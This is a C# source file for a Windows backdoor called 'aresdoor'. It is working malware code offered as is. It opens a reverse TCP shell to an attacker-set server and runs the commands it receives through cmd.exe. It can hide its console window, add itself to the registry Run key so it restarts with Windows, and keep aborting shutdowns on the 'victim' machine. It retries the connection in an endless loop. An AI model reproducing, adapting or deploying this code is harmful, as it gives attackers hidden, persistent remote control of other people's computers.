﻿using System;
using System.Net;

namespace aresdoor
{
    class Networking
    {
        /* Check connection to a defined server */
        public static bool checkInternetConn(string server)
        {
            try
            {
                using (System.Net.NetworkInformation.Ping pingSender = new System.Net.NetworkInformation.Ping())
                {
                    System.Net.NetworkInformation.PingReply reply = pingSender.Send(server);
                    return reply.Status == System.Net.NetworkInformation.IPStatus.Success ? true : false;
                }
            }
            catch (Exception) { return false; }
        }

        /* Resolve hostname to the first IP address that shows in the array */
        public static string resolveHostName(string hostname)
        {
            IPAddress[] addressList = Dns.GetHostAddresses(hostname);
            return addressList[0].ToString();
        }
    }

    class Misc
    {
        /* Execute commands via command prompt */
        public static string execCommandPrompt(string cmd)
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/C " + cmd;
            p.Start();

            // To avoid deadlocks, always read the output stream first and then wait.
            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();

            return output; // return output of command
        }

        /* Execute commands via powershell */
        public static string execPowershellCommand(string cmd)
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = "powershell.exe";
            p.StartInfo.Arguments = "/C " + cmd;
            p.Start();

            // To avoid deadlocks, always read the output stream first and then wait.
            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();

            return output; // return output of command
        }

        /* Convert string to a byte array */
        public static byte[] byteCode(string contents)
        { return System.Text.Encoding.ASCII.GetBytes(contents); }

        /* Append current executing assembly to the autorun registration in Windows. */
        public static void SetStartup()
        {
            Microsoft.Win32.RegistryKey rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            string currfile = System.Reflection.Assembly.GetExecutingAssembly().Location;
            rk.SetValue(System.IO.Path.GetFileName(currfile), currfile);
        }
    }

    class Program
    {
        private static string shellcode_ = System.IO.Directory.GetCurrentDirectory() + "> ";
        private static byte[] shellcode = System.Text.Encoding.ASCII.GetBytes(shellcode_);

        // Modify these variables as needed.
        private static string server = "localhost";
        private static int port = 9000;
        private static bool prevent_shutdown = false;
        private static bool debugMode = true;
        
        private static void sendBackdoor(string server, int port)
        {
            try
            {
                System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(server, port);
                System.Net.Sockets.NetworkStream stream = client.GetStream();
                string responseData;
               
                while (true)
                {
                    byte[] shellcode = Misc.byteCode(System.IO.Directory.GetCurrentDirectory() + "> ");

                    stream.Write(shellcode, 0, shellcode.Length); // Send Shellcode
                    byte[] data = new byte[256]; byte[] output = Misc.byteCode("");

                    // String to store the response ASCII representation.
                    
                    int bytes = stream.Read(data, 0, data.Length);
                    responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);

                    if (responseData.Contains("cd"))
                        System.IO.Directory.SetCurrentDirectory(responseData.Split(" ".ToCharArray())[1]);
                    else if (responseData.Contains("setStartup"))
                    {
                        Misc.SetStartup();
                        output = Misc.byteCode("Application added to startup registry.\n");
                    }
                    else
                        try { output = Misc.byteCode(Misc.execCommandPrompt(responseData)); } catch (Exception) { output = Misc.byteCode("Command couldn't execute."); }

                    try
                    { stream.Write(output, 0, output.Length); } // Send output of command back to attacker.
                    catch (System.IO.IOException)
                    {
                        stream.Close();
                        client.Close();
                        break;
                    }
                }

                // Close everything.
                stream.Close();
                client.Close();
            }
            catch (System.Net.Sockets.SocketException) { } // Pass socket connection silently.
            catch (Exception exc) { Console.WriteLine(exc.Message); }
        }
       

        static void Main(string[] args)
        {
            /*
             * Usage:
             *      ./aresdoor.exe [server] [port]
             *      or
             *      ./aresdoor.exe (no args) << requires hardcoded configuration
             * 
             */

            /* Hide console if debug mode is disabled. */
            var handle = GetConsoleWindow();
            if (!debugMode)
                ShowWindow(handle, SW_HIDE); // hide window

            /* Intercept command line arguments if any are found. */
            try
            {
                if (args.Length >= 2)
                { server = args[0]; port = Int32.Parse(args[1]); }
            } catch (Exception exc) { Console.WriteLine(exc.Message); }

            /* Undertermined code. Not sure if it's required or not? */
            if (System.Diagnostics.Process.GetProcessesByName(System.Diagnostics.Process.GetCurrentProcess().ToString()).Length != 0)
            { System.Environment.Exit(0); }

            /* Prevent the client (victim) from shutting down the computer */
            if (prevent_shutdown == true)
            {
                new System.Threading.Thread(() =>
                {
                    System.Threading.Thread.CurrentThread.IsBackground = true;
                    while (true)
                    {
                        System.Diagnostics.Process process = new System.Diagnostics.Process();
                        process.StartInfo.FileName = "shutdown.exe";
                        process.StartInfo.Arguments = "-a";
                        process.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        process.Start();
                        process.WaitForExit();
                        System.Threading.Thread.Sleep(2000);
                    }
                }).Start();
            }

            /* Persistant backdoor connection */
            while (true)
            {
                if (Networking.checkInternetConn(server)) // Determine if the victim is able to connect to the attacker via DHCP (ping) request 
                {
                    try
                    {
                        if (debugMode) { Console.WriteLine("Sending backdoor to: {0}, port: {1}", server, port); }
                        sendBackdoor(server, port);
                    }
                    catch (Exception exc)
                    { if (debugMode) { Console.WriteLine(exc.Message); } } // pass silently unless debug mode is enabled
                } else
                { if (debugMode) { Console.WriteLine("Couldn't connect to {0}:{1}. Retrying in 5 seconds...", Networking.resolveHostName(server), port); } }
                System.Threading.Thread.Sleep(5000); // sleep for 5 seconds before retrying
            }
        }

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_SHOW = 1;
        const int SW_HIDE = 0;
    }
}
